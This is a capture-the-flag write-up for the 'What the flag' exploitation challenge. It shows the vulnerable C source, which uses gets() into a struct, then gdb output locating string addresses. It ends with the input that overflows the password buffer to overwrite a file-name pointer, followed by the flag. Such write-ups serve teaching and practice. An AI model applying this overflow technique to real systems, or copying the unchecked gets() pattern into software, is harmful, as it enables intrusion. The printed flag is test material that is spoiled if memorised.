### Solved by superkojiman

What the flag is a 140 point exploitation challenge. 

> This binary uses stack cookies to prevent exploitation, but all hope is not lost. Read the flag from flag.txt anyways! The binary can be found at /home/what_the_flag/ on the shell server. You can solve this problem interactively here. The source can be found here.

This challenge is interesting in that it gives us a neat interface to solve it. Here's how it looks:

![](/images/2014/pico/what_the_flag/01.png)

We're given the source code for the binary:

```c
#include <stdlib.h>
#include <stdio.h>

struct message_data{
    char message[128];
    char password[16];
    char *file_name;
};

void read_file(char *buf, char *file_path, size_t len){
    FILE *file;
    if(file= fopen(file_path, "r")){
        fgets(buf, len, file);
        fclose(file);
    }else{
        sprintf(buf, "Cannot read file: %s", file_path);
    }
}

int main(int argc, char **argv){
    struct message_data data;
    data.file_name = "not_the_flag.txt";

    puts("Enter your password too see the message:");
    gets(data.password);

    if(!strcmp(data.password, "1337_P455W0RD")){
        read_file(data.message, data.file_name, sizeof(data.message));
        puts(data.message);
    }else{
        puts("Incorrect password!");
    }

    return 0;
}
```

We basically need to enter the password "1337_P455W0RD" and and somehow manage to overwrite the file pointer so that it reads the flag. Let's see what happens when we run the program and provide the expected password:

```text
pico1139@shell:/home/what_the_flag$ ./what_the_flag
Enter your password too see the message:
1337_P455W0RD
Cannot read file: not_the_flag.txt
```

According to the interactive page, we can start overwriting the file pointer by passing in another 3 bytes after the password.

![](/images/2014/pico/what_the_flag/02.png)

So what should we overwrite it to? We want flag.txt, so all we need to do is find the address of flag.txt from not_the_flag.txt. 

```
pico1139@shell:/home/what_the_flag$ gdb -q what_the_flag
Reading symbols from what_the_flag...(no debugging symbols found)...done.
(gdb) br *puts
Breakpoint 1 at 0x8048460
(gdb) x/s 0x08048777
0x8048777:  "not_the_flag.txt"
(gdb) x/s 0x0804877f
0x804877f:  "flag.txt"
```

So we'll ovewrite the file pointer with 0x804877f to make it read flag.txt. From gets()'s manual:

> gets() reads a line from stdin into the buffer pointed to by s until either a terminating newline or EOF, which it replaces with a null byte ('\0'). No check for buffer overrun is performed (see BUGS below).

So by using the following input, we can overwrite the file pointer and still provide the correct password: 

```
1337_P455W0RD\0aa\x7f\x87\x04\x08
```

Punch it into the interactive page and we get the flag:

![](/images/2014/pico/what_the_flag/03.png)

The flag is **who_needs_%eip**
